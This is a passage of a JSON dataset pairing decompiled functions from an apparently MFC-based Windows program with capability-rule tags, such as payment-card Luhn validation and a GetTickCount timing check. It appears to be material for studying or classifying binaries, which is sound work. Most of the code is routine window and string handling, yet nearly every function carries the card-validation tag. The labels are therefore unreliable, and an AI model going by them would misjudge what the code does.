        "decompiled_code": "\nuint * fcn.0041b368(void)\n\n{\n    uint uVar1;\n    uint *extraout_ECX;\n    uint var_4h;\n    uint uStack72;\n    uint uStack68;\n    uint *puStack64;\n    code *pcStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    code *pcStack36;\n    int32_t iStack24;\n    code *pcStack20;\n    uint uStack8;\n    \n    puStack64 = &uStack8;\n    uStack68 = 0x42f920;\n    uStack8 = 0x44d460;\n    pcStack20 = fcn.0041b381;\n    fcn.0040c2cc(puStack64, 0x42f920);\n    iStack52 = 0x42f968;\n    iStack24 = 0x44d3c8;\n    pcStack36 = fcn.0041b39a;\n    pcStack20 = &stack0xfffffffc;\n    fcn.0040c2cc(&iStack24, 0x42f968);\n    uStack72 = uStack8;\n    pcStack60 = pcStack20;\n    iStack56 = iStack24 + -1;\n    iStack52 = iStack52 + -0x76c;\n    pcStack36 = &pcStack20;\n    uVar1 = fcn.0040ce8e(&uStack72);\n    *extraout_ECX = uVar1;\n    return extraout_ECX;\n}\n",
        "token_count": 337
    },
    "0041b39a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall\nfcn.0041b39a(uint *param_1, int32_t param_2, int32_t param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n            uint param_8)\n\n{\n    uint uVar1;\n    int32_t var_8h;\n    int32_t var_4h_2;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h;\n    uint var_4h;\n    uint var_20h_2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h_2;\n    int32_t var_14h_2;\n    int32_t var_10h_2;\n    uint var_4h_3;\n    \n    var_24h = var_4h;\n    var_20h = var_18h;\n    var_1ch = var_14h;\n    var_18h_2 = var_10h;\n    var_14h_2 = var_4h_2 + -1;\n    var_10h_2 = var_8h + -0x76c;\n    var_4h_3 = var_20h_2;\n    uVar1 = fcn.0040ce8e(&var_24h);\n    *param_1 = uVar1;\n    return param_1;\n}\n",
        "token_count": 321
    },
    "0041b7fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b7fa(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.0041bd04(param_2 * param_3 + 4);\n    *puVar1 = *param_1;\n    *param_1 = puVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "0041b9f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041b9f9(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.0041b972(arg_8h, &arg_8h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.0041b873(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.0041b90c();\n        puVar2[1] = iVar1;\n        *puVar2 = *(*(in_ECX + 4) + arg_8h * 4);\n        *(*(in_ECX + 4) + arg_8h * 4) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 209
    },
    "0041be9a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.0041be9a(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    int32_t arg_8h;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x1c);\n        if ((iVar3 != 0) && (*(iVar3 + 0x1c) != 0)) {\n            iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x1c));\n            if (iVar1 != 0) {\n                fcn.0041d981(iVar3, *(iVar3 + 0x1c), 0x363, 1, 0);\n                fcn.0041f244(*(iVar3 + 0x1c), 0x363, 1, 0, 1, 1);\n            }\n        }\n        fcn.00423ff7();\n        arg_8h = 0x4238d5;\n        iVar1 = fcn.00424808(0x4238d5);\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x54)) {\n            if ((*(iVar1 + 0x1c) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0x88) == 0) {\n                    fcn.00420451(0, arg_8h);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0x88))) {\n                    fcn.0041d981(iVar1, *(iVar1 + 0x1c), 0x363, 1, 0);\n                    arg_8h = *(iVar1 + 0x1c);\n                    fcn.0041f244(arg_8h, 0x363, 1, 0, 1, 1);\n                }\n                iVar2 = *(iVar1 + 0x88);\n                if (0 < iVar2) {\n                    fcn.00420451();\n                    arg_8h = iVar2;\n                }\n                *(iVar1 + 0x88) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.00423ff7();\n        iVar3 = fcn.00424808(0x4238d5);\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.004208eb();\n            fcn.004208f4(1);\n        }\n    }\n    return unaff_EBX < 0;\n}\n",
        "token_count": 629
    },
    "0041c304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041c304(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    iVar1 = *(extraout_ECX + 0x10);\n    *(unaff_EBP + -4) = 0;\n    if (iVar1 != 0) {\n        (**(iVar1 + 0x1c))(extraout_ECX);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 171
    },
    "0041c957": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nuint __cdecl\nfcn.0041c957(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpTemplate;\n    uint var_ch_2;\n    uint hInstance;\n    uint var_10h;\n    uint var_40h;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint hWnd;\n    uint hMem;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar2 = fcn.00423ff7();\n        *(unaff_EBP + 0x10) = *(iVar2 + 8);\n    }\n    iVar2 = fcn.00423ff7();\n    piVar1 = *(iVar2 + 0x1038);\n    *(unaff_EBP + -0x28) = piVar1;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0041fefb(0x10);\n    fcn.0041fefb(0x3c000);\n    if (piVar1 == NULL) {\ncode_r0x0041c9d4:\n        if (*(unaff_EBP + 8) != 0) {\n            *(unaff_EBP + -0x1c) = *0x449654;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x20) = 0;\n            iVar2 = fcn.00420d28(*(unaff_EBP + 8), unaff_EBP + -0x1c, unaff_EBP + -0x20);\n            if (iVar2 == 0) {\ncode_r0x0041ca5f:\n                fcn.00420b77(*(unaff_EBP + 8));\n                *(unaff_EBP + -4) = 2;\n                fcn.00420eb1(*(unaff_EBP + -0x20));\n                uVar3 = fcn.00420c14();\n                *(unaff_EBP + -0x14) = uVar3;\n                *(unaff_EBP + -4) = 1;\n                fcn.00420c06();\n                if (*(unaff_EBP + -0x14) != 0) {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n                    *(unaff_EBP + 8) = uVar3;\n                }\n            }\n            else {\n                iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.0040ba9c(*(unaff_EBP + -0x1c), \"MS Shell Dlg\");\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.0040ba9c(*(unaff_EBP + -0x1c), 0x429d8c);\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.0040ba9c(*(unaff_EBP + -0x1c), \"Helv\");\n                            if (iVar2 != 0) goto code_r0x0041caa1;\n                        }\n                    }\n                    if (*(unaff_EBP + -0x20) == 8) {\n                        *(unaff_EBP + -0x20) = 0;\n                    }\n                    goto code_r0x0041ca5f;\n                }\n            }\ncode_r0x0041caa1:\n            extraout_ECX[0xb] = -1;\n            extraout_ECX[9] = extraout_ECX[9] | 0x10;\n            fcn.0041dff5(extraout_ECX);\n            if (*(unaff_EBP + 0xc) == 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = *(*(unaff_EBP + 0xc) + 0x1c);\n            }\n            uVar3 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)\n                              (*(unaff_EBP + 0x10), *(unaff_EBP + 8), uVar3, fcn.0041c79f, 0);\n            *(unaff_EBP + -0x18) = uVar3;\n            *(unaff_EBP + -4) = 0;\n            fcn.0041d2bd();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (piVar1 != NULL) {\n                (**(*piVar1 + 0x14))(unaff_EBP + -0x34);\n                if (*(unaff_EBP + -0x18) != 0) {\n                    (**(*extraout_ECX + 0xb4))(0);\n                }\n            }\n            iVar2 = fcn.0041e041();\n            if (iVar2 == 0) {\n                (**(*extraout_ECX + 0xa4))();\n            }\n            if ((*(unaff_EBP + -0x18) != 0) && ((*(extraout_ECX + 9) & 0x10) == 0)) {\n                (*_sym.imp.USER32.dll_DestroyWindow)(*(unaff_EBP + -0x18));\n                *(unaff_EBP + -0x18) = 0;\n            }\n            if (*(unaff_EBP + -0x14) != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n            }\n            if ((*(unaff_EBP + -0x18) != 0) || ((*(extraout_ECX + 9) & 0x10) == 0)) {\n                uVar3 = 1;\n                goto code_r0x0041cb73;\n            }\n        }\n    }\n    else {\n        iVar2 = (**(*extraout_ECX + 0xb4))(unaff_EBP + -0x34);\n        if (iVar2 != 0) {\n            uVar3 = (**(*piVar1 + 0x10))(unaff_EBP + -0x34, *(unaff_EBP + 8));\n            *(unaff_EBP + 8) = uVar3;\n            goto code_r0x0041c9d4;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0041cb73:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 1738
    },
    "0041cb91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0041cb91(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.0041d721();\n    *param_1 = vtable.CDialog.0;\n    fcn.0040b990(param_1 + 0xf, 0, 0x20);\n    param_1[0x14] = param_3;\n    param_1[0xf] = param_2;\n    param_1[0x10] = param_2 & 0xffff;\n    return param_1;\n}\n",
        "token_count": 130
    },
    "0041d12a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d12a(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        *param_1 = *0x449654;\n    }\n    else {\n        uVar2 = 0x40;\n        if ((((param_2 < 0x41) || (uVar2 = 0x80,  param_2 < 0x81)) || (uVar2 = 0x100,  param_2 < 0x101)) ||\n           (uVar2 = 0x200,  param_2 < 0x201)) {\n            puVar1 = fcn.0040a9a3();\n            puVar1[2] = uVar2;\n        }\n        else {\n            puVar1 = fcn.0041bd04(param_2 + 0xd);\n            puVar1[2] = param_2;\n        }\n        *puVar1 = 1;\n        *(puVar1 + param_2 + 0xc) = 0;\n        puVar1[1] = param_2;\n        *param_1 = puVar1 + 3;\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "0041d1f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d1f4(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 + -0xc != *0x449658) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(*param_1 + -0xc);\n        if (iVar1 < 1) {\n            fcn.0041d1ac();\n        }\n        *param_1 = *0x449654;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041d2bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d2bd(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 + -0xc != *0x449658) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(*param_1 + -0xc);\n        if (iVar1 < 1) {\n            fcn.0041d1ac();\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0041d339": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041d339(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = *0x449654;\n    if (param_2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0040be85(param_2);\n    }\n    if (iVar1 != 0) {\n        fcn.0041d12a(iVar1 * 2);\n        fcn.0041d5dd(*param_1, param_2, iVar1 * 2 + 1);\n        fcn.0041d595(0xffffffff);\n    }\n    return param_1;\n}\n",
        "token_count": 161
    },
    "0041d385": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d385(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.0041d294(param_2);\n    fcn.0040bb50(*param_1, param_2, param_2);\n    *(*param_1 + -8) = param_2;\n    *(*param_1 + param_2) = 0;\n    return;\n}\n",
        "token_count": 93
    },
    "0041d429": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041d429(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0040be85(param_2);\n    }\n    fcn.0041d294(iVar1 * 2);\n    fcn.0041d5dd(*param_1, param_2, iVar1 * 2 + 1);\n    fcn.0041d595(0xffffffff);\n    return param_1;\n}\n",
        "token_count": 136
    },
    "0041d46a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d46a(int32_t *param_1, int32_t param_2, uint param_3, int32_t param_4)\n\n{\n    if (param_2 + param_4 != 0) {\n        fcn.0041d12a(param_2 + param_4);\n        fcn.0040bb50(*param_1, param_2, param_2);\n        fcn.0040bb50(*param_1 + param_2, param_4, param_4);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0041d721": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.0041d721(code **param_1)\n\n{\n    fcn.0041c2ea();\n    *param_1 = vtable.CWnd.0;\n    fcn.0040b990(param_1 + 7, 0, 0x20);\n    return param_1;\n}\n",
        "token_count": 72
    },
    "0041d75f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0041d75f(code **param_1, code *param_2)\n\n{\n    fcn.0041c2ea();\n    *param_1 = vtable.CWnd.0;\n    fcn.0040b990(param_1 + 7, 0, 0x20);\n    param_1[7] = param_2;\n    return param_1;\n}\n",
        "token_count": 92
    },
    "0041db69": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041db69(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0041dad0(0);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = fcn.0041b9a4(unaff_retaddr);\n    }\n    return uVar2;\n}\n",
        "token_count": 93
    },
    "0041e7d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.0041e7d7(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_1;\n    uint *noname_3;\n    uint lpWndClass;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00423dca();\n    iVar1 = iVar1 + 0x58;\n    iVar2 = fcn.00423ff7();\n    var_18h = *(iVar2 + 8);\n    if (((arg_ch == 0) && (arg_10h == 0)) && (arg_14h == 0)) {\n        (*_sym.imp.USER32.dll_wsprintfA)(iVar1, \"Afx:%x:%x\", var_18h, arg_8h);\n    }\n    else {\n        (*_sym.imp.USER32.dll_wsprintfA)(iVar1, \"Afx:%x:%x:%x:%x:%x\", var_18h, arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    noname_3 = &lpWndClass;\n    noname_1 = var_18h;\n    iVar2 = iVar1;\n    iVar3 = (*_sym.imp.USER32.dll_GetClassInfoA)();\n    if (iVar3 == 0) {\n        lpWndClass = arg_8h;\n        var_24h = _sym.imp.USER32.dll_DefWindowProcA;\n        var_1ch = 0;\n        var_20h = 0;\n        var_8h = 0;\n        var_14h = arg_14h;\n        var_10h = arg_ch;\n        var_ch = arg_10h;\n        var_4h = iVar1;\n        iVar2 = fcn.0041e736(&lpWndClass, noname_1, iVar2, noname_3, unaff_EDI, unaff_ESI, unaff_EBX, arg_8h, \n                             _sym.imp.USER32.dll_DefWindowProcA, 0, 0, var_18h, arg_14h, arg_ch, arg_10h, 0);\n        if (iVar2 == 0) {\n            fcn.00422446();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 753
    },
    "0041f9b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f9b2(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t lpPoints;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0042031c();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x1c), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x1c);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_28h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.00403370();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x1c);\n            }\n            uVar3 = fcn.00403e08(iVar5, 1);\n            fcn.00403e73(uVar3, iVar5);\n            pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.00403e08(iVar5, 2);\n            fcn.00403e73(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_30h) / 2 - (var_20h - var_28h) / 2;\n    iVar4 = (var_34h + var_2ch) / 2 - (var_1ch - var_24h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_20h - var_28h) + iVar5)) {\n        lprcDst = (var_10h - var_20h) + var_28h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_1ch - var_24h) + iVar4)) {\n        var_14h = (var_24h - var_1ch) + var_ch;\n    }\n    fcn.00420402(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1084
    },
    "004206e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004206e0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00420659(0);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = fcn.0041b9a4(unaff_retaddr);\n    }\n    return uVar2;\n}\n",
        "token_count": 92
    },
    "00420c1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420c1a(int32_t param_1)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar1 = param_1 + 0x1a;\n    }\n    else {\n        piVar1 = param_1 + 0x12;\n    }\n    iVar2 = *piVar1;\n    if (iVar2 == -1) {\n        piVar1 = piVar1 + 2;\n    }\n    else {\n        while (piVar1 = piVar1 + 1,  iVar2 != 0) {\n            iVar2 = *piVar1;\n        }\n    }\n    iVar2 = *piVar1;\n    if (iVar2 == -1) {\n        piVar1 = piVar1 + 2;\n    }\n    else {\n        while (piVar1 = piVar1 + 1,  iVar2 != 0) {\n            iVar2 = *piVar1;\n        }\n    }\n    do {\n        iVar2 = *piVar1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 266
    },
    "00421450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00421450(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint unaff_retaddr;\n    \n    pcVar1 = fcn.0041d546(0x104);\n    fcn.0040b990(pcVar1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpynA)(pcVar1, unaff_retaddr, 0x104);\n    cVar3 = *pcVar1;\n    pcVar2 = pcVar1;\n    while ((cVar3 != '\\0' && (((cVar3 != '\\\\' && (cVar3 != '/')) || ((pcVar2[1] != '\\\\' && (pcVar2[1] != '/'))))))) {\n        pcVar2 = fcn.0040bf39(pcVar2);\n        cVar3 = *pcVar2;\n    }\n    if (*pcVar2 == '\\0') {\n        cVar3 = *pcVar1;\n        while (((cVar3 != '\\0' && (cVar3 != '\\\\')) && (cVar3 != '/'))) {\n            pcVar1 = fcn.0040bf39(pcVar1);\n            cVar3 = *pcVar1;\n        }\n    }\n    else {\n        for (pcVar1 = pcVar2 + 2; ((cVar3 = *pcVar1,  cVar3 != '\\0' && (cVar3 != '\\\\')) && (cVar3 != '/'));\n            pcVar1 = fcn.0040bf39(pcVar1)) {\n        }\n        if (*pcVar1 == '\\0') goto code_r0x004214d1;\n        do {\n            pcVar1 = fcn.0040bf39(pcVar1);\ncode_r0x004214d1:\n            cVar3 = *pcVar1;\n        } while (((cVar3 != '\\0') && (cVar3 != '\\\\')) && (cVar3 != '/'));\n    }\n    if (*pcVar1 != '\\0') {\n        pcVar1[1] = '\\0';\n    }\n    fcn.0041d595(0xffffffff);\n    return;\n}\n",
        "token_count": 476
    },
    "004218a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004218a5(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (0x10b < param_1) {\n        if (param_1 == 0x3e3) {\n            return 10;\n        }\n        if (param_1 == 0x3e4) {\n            return 10;\n        }\n        if (param_1 == 0x3e5) {\n            return 10;\n        }\n        if (param_1 == 999) {\n            return 5;\n        }\n        return 1;\n    }\n    if (param_1 == 0x10b) {\n        return 3;\n    }\n    if (param_1 < 0x3f) {\n        if (param_1 == 0x3e) {\n            return 8;\n        }\n        if (param_1 < 0x1a) {\n    // switch table (25 cases) at 0x421a9b\n            switch(param_1) {\n            case 0:\n                return 0;\n            case 1:\n            case 7:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0xe:\n                goto code_r0x004219a7;\n            case 2:\n            case 6:\n            case 0x12:\n                goto code_r0x004219a7;\n            case 3:\n            case 0xf:\n            case 0x11:\n                goto code_r0x004219a7;\n            case 4:\n                return 4;\n            case 5:\n            case 0xc:\n            case 0x13:\ncode_r0x004219a7:\n                return 5;\n            case 0xb:\ncode_r0x004219a7:\n                return 6;\n            case 0x10:\n                return 7;\n            case 0x14:\n            case 0x15:\n            case 0x16:\n            case 0x17:\ncode_r0x004219a7:\n                return 10;\n            default:\n                goto code_r0x004219a7;\n            }\n        }\n        if (0x27 < param_1) {\n    // switch table (9 cases) at 0x421aff\n            switch(param_1) {\n            case 0x34:\n            case 0x35:\n            case 0x37:\n                goto code_r0x004219a7;\n            case 0x36:\n            case 0x3a:\n                goto code_r0x004219a7;\n            default:\n                return 1;\n            case 0x39:\n            case 0x3b:\n                goto code_r0x004219a7;\n            case 0x3c:\n                goto code_r0x004219a7;\n            }\n        }\n        if (param_1 == 0x27) {\n            return 0xd;\n        }\n        if (0x20 < param_1) {\n            if (param_1 == 0x21) {\n                return 0xc;\n            }\n            if (param_1 == 0x22) {\n                return 3;\n            }\n            if (param_1 == 0x24) {\n                return 4;\n            }\n            if (param_1 == 0x26) {\n                return 0xe;\n            }\n            return 1;\n        }\n        if (param_1 == 0x20) {\n            return 0xb;\n        }\n        if (param_1 == 0x1a) {\n            return 6;\n        }\n        if (param_1 == 0x1b) {\n            return 9;\n        }\n        iVar1 = param_1 - 0x1d;\n        if (iVar1 == 0) {\n            return 5;\n        }\ncode_r0x0042191d:\n        if (iVar1 == 1) {\ncode_r0x004219a7:\n            return 9;\n        }\n    }\n    else {\n        if (param_1 < 0x6c) {\n            if (param_1 